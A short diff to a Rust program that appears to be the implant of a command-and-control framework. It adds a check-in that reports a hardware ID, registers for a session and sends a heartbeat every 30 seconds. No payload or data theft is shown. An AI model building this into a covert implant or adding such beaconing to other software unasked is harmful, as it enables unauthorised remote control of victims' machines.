@@ -1,5 +1,7 @@
 mod config;
 mod transport;
+mod checkin;
+mod platform;
 
 use oxide_shared::packet::Packet;
 
@@ -11,15 +13,17 @@ async fn main() -> anyhow::Result<()> {
     let mut transport = transport::Transport::connect(&config).await?;
     println!("[+] TLS handshake complete");
 
-    let checkin = Packet::new("checkin", serde_json::json!({
-        "hwid": "skeleton-hwid",
-        "hostname": "test-host",
-    }));
-    transport.send(checkin).await?;
-    println!("[+] Sent check-in");
+    let checkin_pkt = checkin::build_checkin_packet();
+    println!("[*] HWID: {}", checkin_pkt.data["hwid"]);
+    transport.send(checkin_pkt).await?;
+    println!("[+] Check-in sent");
 
     let ack = transport.receive().await?;
-    println!("[+] Received: {} (type={})", ack.id, ack.packet_type);
+    println!("[+] Registered, session: {}", ack.data["session_id"]);
 
-    Ok(())
+    loop {
+        tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
+        let hb = Packet::new("heartbeat", serde_json::json!({}));
+        transport.send(hb).await?;
+    }
 }
